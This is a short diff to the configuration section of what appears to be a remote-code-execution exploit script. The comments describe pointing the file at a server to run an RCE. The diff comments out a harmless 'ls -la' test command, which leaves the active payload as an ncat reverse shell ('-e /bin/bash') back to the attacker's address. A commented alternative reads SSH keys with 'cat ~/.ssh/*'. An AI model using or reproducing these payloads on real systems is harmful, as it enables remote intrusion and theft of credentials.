@@ -27,7 +27,7 @@
 # installed is also listening on ANY tcp connect, we
 # can point this file at the server to run an RCE.
 DST_ADDR="127.0.0.1"
-DST_PORT="22" # Yes you can pop over SSH
+DST_PORT="22" 
 
 # [Source address]
 #
@@ -51,7 +51,7 @@ NCAT="/usr/bin/ncat"
 # The remote command to run on the server!
 # ================================================
 RCE="ncat ${SRC_ADDR} ${RCE_PORT} -e /bin/bash &"
-RCE="ls -la"
+#RCE="ls -la"
 #RCE="cat ~/.ssh/*"
 # ================================================
 
